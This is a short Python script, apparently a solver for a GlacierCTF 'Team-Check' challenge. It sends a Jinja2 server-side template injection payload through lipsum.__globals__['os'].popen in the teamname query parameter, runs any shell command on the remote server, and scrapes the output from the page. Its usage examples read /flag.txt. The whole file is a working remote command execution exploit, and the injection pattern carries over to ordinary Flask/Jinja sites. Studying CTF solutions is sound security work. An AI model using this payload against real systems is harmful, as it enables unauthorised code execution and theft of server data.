#!/usr/bin/env python3
"""GlacierCTF Team-Check: original SSTI helper from the agent archive.

Usage:
    python3 ssti.py 'id'
    python3 ssti.py 'cat /flag.txt'

This targets the historical CTF challenge URL and has no dependencies
outside Python's standard library.
"""
import sys
import re
import html
import urllib.parse
import urllib.request

BASE = "https://teamcheck.web.glacierctf.com/check_team?teamname="

def run(command):
    payload = "{%print(lipsum.__globals__['os'].popen(" + repr(command) + ").read())%}"
    url = BASE + urllib.parse.quote(payload)
    req = urllib.request.Request(url, headers={"User-Agent": "curl/8"})
    page = urllib.request.urlopen(req, timeout=40).read().decode("utf-8", "replace")
    match = re.search(r'alert (?:info|danger|success)">(.*?)</h3>', page, re.S)
    if not match:
        return "(no output)"
    result = html.unescape(match.group(1))
    result = re.sub(r'^\s*We are unsure if\s*', '', result)
    result = re.sub(r'\s*has used AI in the past\.?\s*$', '', result)
    return result

if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("Usage: python3 ssti.py '<command>'")
    print(run(sys.argv[1]))
